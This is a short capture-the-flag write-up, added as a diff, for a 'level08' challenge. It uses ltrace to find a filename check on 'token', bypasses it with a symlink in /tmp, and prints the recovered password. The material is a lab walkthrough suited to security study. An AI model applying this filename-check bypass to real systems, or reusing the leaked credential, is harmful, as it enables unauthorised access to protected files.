@@ -1,0 +1,30 @@
+Ok !
+We have here two files a bin level08 and a file named token
+
+The level08 binary seems to be a simple reader
+It can read a file created in /tmp but not the token file:
+"You may not access 'token'"
+
+Thus, with ltace, we have
+
+ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff6e4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                        = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)                    = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+
+The bin make verification on the file name 'token'
+
+We could change the name of the file token but we haven't the rights too
+
+THEN ! We can create a simlink to token, from the /tmp dir, called "sl" here:
+ln -s ~/token /tmp/f/sl
+
+pw printed: quif5eloekouj29ke0vouxean
+
+This works !
+
+See flag in flag file
